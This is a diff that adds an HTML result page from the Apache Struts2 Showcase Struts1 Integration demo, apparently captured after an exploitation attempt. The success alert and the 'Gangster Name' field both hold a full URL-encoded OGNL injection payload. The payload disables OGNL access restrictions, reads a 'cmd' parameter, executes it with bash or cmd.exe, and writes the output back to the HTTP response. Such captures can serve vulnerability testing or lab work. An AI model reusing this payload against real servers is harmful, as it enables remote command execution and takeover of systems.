@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
+    <meta name="description" content="Struts2 Showcase for Apache Struts Project">
+    <meta name="author" content="The Apache Software Foundation">
+
+    <title>Struts2 Showcase - Struts1 Integration - Result</title>
+
+    <link href="/styles/bootstrap.css" rel="stylesheet" type="text/css" media="all">
+    <link href="/styles/bootstrap-responsive.css" rel="stylesheet" type="text/css" media="all">
+    <link href="/styles/main.css" rel="stylesheet" type="text/css" media="all" />
+
+    <script src="/js/jquery-1.8.2.min.js"></script>
+    <script src="/js/bootstrap.min.js"></script>
+    <script type="text/javascript">
+        $(function () {
+            $('.dropdown-toggle').dropdown();
+            var alerts = $('ul.alert').wrap('<div />');
+            alerts.prepend('<a class="close" data-dismiss="alert" href="#">&times;</a>');
+            alerts.alert();
+        });
+    </script>
+
+    <!-- Prettify -->
+    <link href="/styles/prettify.css" rel="stylesheet">
+    <script src="/js/prettify.js"></script>
+
+    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+    <!--[if lt IE 9]>
+        <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+        <![endif]-->
+
+    <style type="text/css">
+        .label {
+            background-color: #ffffff;
+            color: #000000;
+            text-shadow: none;
+            font-weight: bold;
+        }
+    </style>
+</head>
+
+<body id="page-home" onload="prettyPrint();">
+
+    <div class="navbar navbar-fixed-top">
+        <div class="navbar-inner">
+            <div class="container-fluid">
+                <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                    <span class="icon-bar"></span>
+                </a>
+                <a href="/;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2" class="brand">Struts2 Showcase</a>
+                <div class="nav-collapse">
+                    <ul class="nav">
+                        <li><a href="/;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2"><i class="icon-home"></i> Home</a>
+                        </li>
+                        <li class="dropdown">
+                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Configuration<b
+                                    class="caret"></b></a>
+                            <ul class="dropdown-menu">
+                                <li><a
+                                        href="/actionchaining/actionChain1!input.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Action
+                                        Chaining</a></li>
+                                <li><a href="/config-browser/index.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Config
+                                        Browser</a></li>
+                                <li><a
+                                        href="/conversion/index.jsp;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Conversion</a>
+                                </li>
+                                <li><a href="/person/index.html;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Person
+                                        Manager ( by Conventions )</a></li>
+                            </ul>
+                        </li>
+                        <li class="dropdown">
+                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Tags<b class="caret"></b></a>
+                            <ul class="dropdown-menu">
+                                <li class="dropdown-submenu">
+                                    <a href="#">Non UI Tags</a>
+                                    <ul class="dropdown-menu">
+                                        <li><a
+                                                href="/tags/non-ui/actionTag/showActionTagDemo.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Action
+                                                Tag</a></li>
+                                        <li><a
+                                                href="/tags/non-ui/date.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Date
+                                                Tag</a></li>
+                                        <li><a
+                                                href="/tags/non-ui/debugTagDemo.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Debug
+                                                Tag</a></li>
+                                        <li><a
+                                                href="/tags/non-ui/iteratorGeneratorTag/showGeneratorTagDemo.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Iterator
+                                                Generator Tag</a></li>
+                                        <li>
+
+                                            <a
+                                                href="/tags/non-ui/appendIteratorTag/showAppendTagDemo.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Append
+                                                Iterator Tag</a>
+                                        <li>
+
+                                            <a
+                                                href="/tags/non-ui/mergeIteratorTag/showMergeTagDemo.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Merge
+                                                Iterator Demo</a>
+                                        <li>
+
+                                            <a
+                                                href="/tags/non-ui/subsetIteratorTag/showSubsetTagDemo.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Subset
+                                                Tag</a>
+                                        <li><a
+                                                href="/tags/non-ui/actionPrefix/actionPrefixExampleUsingFreemarker.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Action
+                                                Prefix Example (Freemarker)</a></li>
+                                        <li><a
+                                                href="/tags/non-ui/ifTag/testIfTagJsp.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">If
+                                                Tag (JSP)</a></li>
+                                        <li><a
+                                                href="/tags/non-ui/ifTag/testIfTagFreemarker.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">If
+                                                Tag (Freemarker)</a></li>
+                                    </ul>
+
+                                </li>
+                                <li class="dropdown-submenu">
+                                    <a href="#">UI Tags</a>
+                                    <ul class="dropdown-menu">
+                                        <li><a
+                                                href="/tags/ui/example!input.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">UI
+                                                Example</a></li>
+                                        <li><a
+                                                href="/tags/ui/exampleVelocity!input.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">UI
+                                                Example (Velocity)</a></li>
+                                        <li><a
+                                                href="/tags/ui/lotsOfOptiontransferselect!input.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Option
+                                                Transfer Select UI
+                                                Example</a></li>
+                                        <li><a
+                                                href="/tags/ui/moreSelects!input.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">More
+                                                Select Box UI Examples</a></li>
+                                        <li>
+
+                                            <a
+                                                href="/tags/ui/treeExampleStatic.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Tree
+                                                Example (static)</a>
+                                        <li>
+
+                                            <a
+                                                href="/tags/ui/showDynamicTreeAction.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Tree
+                                                Example (dynamic)</a>
+                                        <li>
+
+                                            <a
+                                                href="/tags/ui/showDynamicAjaxTreeAction.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Tree
+                                                Example (dynamic ajax loading)</a>
+                                        <li>
+
+                                            <a
+                                                href="/tags/ui/componentTagExample.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Component
+                                                Tag Example</a>
+                                        <li><a
+                                                href="/tags/ui/actionTagExample!input.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Action
+                                                Tag Example</a></li>
+                                        <li><a
+                                                href="/tags/ui/datepicker.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">DateTime
+                                                picker tag - Pick a date</a></li>
+                                        <li><a
+                                                href="/tags/ui/timepicker.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">DateTime
+                                                picker tag - Pick a time</a></li>
+
+                                    </ul>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="dropdown">
+                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">File<b class="caret"></b></a>
+                            <ul class="dropdown-menu">
+                                <li><a href="/filedownload/index.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">File
+                                        Download</a></li>
+                                <li class="dropdown-submenu">
+                                    <a href="#">File Upload</a>
+                                    <ul class="dropdown-menu">
+                                        <li>
+
+                                            <a
+                                                href="/fileupload/upload.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Single
+                                                File Upload</a>
+                                        </li>
+                                        <li>
+
+                                            <a
+                                                href="/fileupload/multipleUploadUsingList.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Multiple
+                                                File Upload (List)</a>
+
+                                        </li>
+                                        <li>
+
+                                            <a
+                                                href="/fileupload/multipleUploadUsingArray.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Multiple
+                                                File Upload (Array)</a>
+                                        </li>
+                                    </ul>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="dropdown">
+                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Examples<b class="caret"></b></a>
+                            <ul class="dropdown-menu">
+                                <li class="dropdown-submenu">
+                                    <a href="#">Hangman</a>
+                                    <ul class="dropdown-menu">
+                                        <li><a
+                                                href="/hangman/hangmanNonAjax.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Hangman
+                                                (Non Ajax)</a></li>
+                                        <li><a
+                                                href="/hangman/hangmanAjax.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Hangman
+                                                (Ajax - Experimental)</a></li>
+                                    </ul>
+                                </li>
+                                <li><a href="/person/index.html;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Person
+                                        Manager</a></li>
+                                <li><a href="/skill/index.html;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">CRUD</a>
+                                </li>
+                                <li><a href="/wait/index.html;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Execute &amp;
+                                        Wait</a></li>
+                                <li><a href="/token/index.html;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Token</a>
+                                </li>
+                                <li><a
+                                        href="/validation/index.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Validation</a>
+                                </li>
+                                <li><a
+                                        href="/modelDriven/modelDriven.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Model
+                                        Driven</a></li>
+                            </ul>
+                        </li>
+                        <li class="dropdown">
+                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">Integration<b
+                                    class="caret"></b></a>
+                            <ul class="dropdown-menu">
+                                <li class="dropdown-submenu">
+                                    <a href="#">Freemarker</a>
+                                    <ul class="dropdown-menu">
+                                        <li>
+
+                                            <a
+                                                href="/freemarker/customFreemarkerManagerDemo.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Demo
+                                                of usage of a Custom Freemarker Manager</a>
+                                        </li>
+                                        <li>
+
+                                            <a
+                                                href="/freemarker/standardTags.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Demo
+                                                of Standard Struts Freemarker Tags</a>
+                                        </li>
+                                    </ul>
+                                </li>
+                                <li><a href="/jsf/index.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">JavaServer
+                                        Faces</a></li>
+                                <li><a
+                                        href="/integration/editGangster.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Struts
+                                        1 Integration</a></li>
+                                <li><a href="/tiles/index.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Tiles</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li class="dropdown">
+                            <a href="#" class="dropdown-toggle" data-toggle="dropdown">AJAX<b class="caret"></b></a>
+                            <ul class="dropdown-menu">
+                                <li><a href="/ajax/index.html;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Ajax
+                                        plugin</a></li>
+                                <li><a href="/chat/index.html;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Ajax Chat</a>
+                                </li>
+                            </ul>
+                        </li>
+                        <li><a href="/interactive/index.action;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Interactive
+                                Demo</a></li>
+                    </ul>
+                    <ul class="nav pull-right">
+                        <li class="dropdown last">
+                            <a href="#" class="dropdown-toggle" data-toggle="dropdown"><i class="icon-flag"></i> Help<b
+                                    class="caret"></b></a>
+                            <ul class="dropdown-menu">
+                                <li><a href="/help.jsp;jsessionid=A8FE7B2A41DF7BFCB57AD25D855C6CF2">Help</a></li>
+                                <li><a href="http://struts.apache.org/mail.html"><i class="icon-share"></i> User Mailing
+                                        List</a></li>
+                                <li><a href="http://struts.apache.org/2.x/"><i class="icon-share"></i> Struts2
+                                        Website</a>
+                                </li>
+                                <li><a href="http://struts.apache.org/2.x/docs/home.html"><i class="icon-share"></i>
+                                        Documentation</a></li>
+                            </ul>
+                        </li>
+                    </ul>
+                </div>
+                <!--/.nav-collapse -->
+            </div>
+        </div>
+    </div>
+
+    <div class="page-header">
+        <h1>Struts1 Integration - Result</h1>
+    </div>
+
+    <div class="container-fluid">
+        <div class="row-fluid">
+            <div class="span12">
+
+                <ul class="alert alert-info">
+                    <li><span>Gangster
+                            %25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%23parameters.cmd%5B0%5D%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D
+                            added successfully</span></li>
+                </ul>
+
+                <tr>
+                    <td class="tdLabel"><label for="name" class="label">Gangster Name:</label></td>
+                    <td><label
+                            id="name">%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%23parameters.cmd%5B0%5D%29.%28%23iswin%3D%28%40java.lang.System%40getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2Fc%27%2C%23cmd%7D%3A%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28%23ros%3D%28%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getOutputStream%28%29%29%29.%28%40org.apache.commons.io.IOUtils%40copy%28%23process.getInputStream%28%29%2C%23ros%29%29.%28%23ros.flush%28%29%29%7D</label>
+                    </td>
+                </tr>
+
+                <br />
+                <tr>
+                    <td class="tdLabel"><label for="age" class="label">Gangster Age:</label></td>
+                    <td><label id="age">1</label></td>
+                </tr>
+
+                <br />
+                <tr>
+                    <td class="tdLabel"><label for="bustedBefore" class="label">Busted Before:</label></td>
+                    <td><label id="bustedBefore">false</label></td>
+                </tr>
+
+                <br />
+                <tr>
+                    <td class="tdLabel"><label for="description" class="label">Gangster Description:</label></td>
+                    <td><label id="description">1</label></td>
+                </tr>
+
+                <br />
+
+            </div>
+        </div>
+    </div>
+
+
+    <hr>
+
+    <footer id="footer" class="footer">
+        <div>
+            <p style="text-align: center;">
+                <a href="/viewSource.action?config=file:/usr/local/tomcat/webapps/ROOT/WEB-INF/classes/struts-integration.xml:39&className=org.apache.struts2.s1.Struts1Action&page=/integration//WEB-INF/integration/modelDrivenResult.jsp"
+                    class="btn btn-info">View Sources</a>
+            </p>
+        </div>
+
+
+        <div class="pull-right">
+            <div>
+
+                2023/03/30 11:44:49
+
+            </div>
+            <!-- end branding -->
+
+            <div>
+                <a href="http://struts.apache.org/2.x/">
+                    <img src="/img/struts-power.gif" alt="Powered by Struts" />
+                </a>
+            </div>
+            <!-- end search -->
+        </div>
+
+        <div class="pull-left">
+            Copyright &copy; 2003-2023
+            <a href="http://www.apache.org">
+                The Apache Software Foundation.
+            </a>
+        </div>
+    </footer>
+</body>
+
+</html>
